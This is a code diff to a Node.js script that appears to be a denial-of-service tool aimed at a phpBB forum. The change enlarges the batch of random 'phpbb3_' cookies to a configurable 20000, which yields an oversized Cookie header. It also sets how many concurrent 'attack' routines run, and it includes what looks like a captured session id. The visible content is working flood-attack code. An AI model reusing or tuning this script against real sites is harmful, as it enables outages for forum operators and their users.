@@ -9,11 +9,15 @@ var loadDataAmount = 0;
 
 var cookies = {};
 
-for(let i = 0; i < 5000; i++) {
-  cookies[i] = _.random(1, 1000 * 1000 * 1000 * 1000).toString(2)
+const cookiesSize = +process.argv[process.argv.length - 1] || 20000;
+const threadsCount = +process.argv[process.argv.length - 2] || 200;
+
+for(let i = 0; i < cookiesSize; i++) {
+  cookies['phpbb3_' + i] = _.random(1, 1000 * 1000 * 1000 * 1000).toString(2)
 }
 
 cookies = qs.encode(cookies, '; ') + 'phpbb3_dfg23_u=1; phpbb3_dfg23_k=; phpbb3_dfg23_sid=0d023aa521d3e041beb18633a9c0bef2; _gat=1; _ym_uid=147321962228649464; _ym_isad=1; _ga=GA1.2.1422368805.1473219621';
+console.log(cookies.length / 1024);
 
 function headers() {
   return {
@@ -94,8 +98,8 @@ setInterval(function () {
   loadTimeSum = 0;
   requestsCount = 0;
   loadDataAmount = 0;
-}, 5000);
+}, 10000);
 
-for (var i = 0; i < 1000; i++) {
+for (var i = 0; i < threadsCount; i++) {
   setTimeout(attack, _.random(1, i * 50));
 }
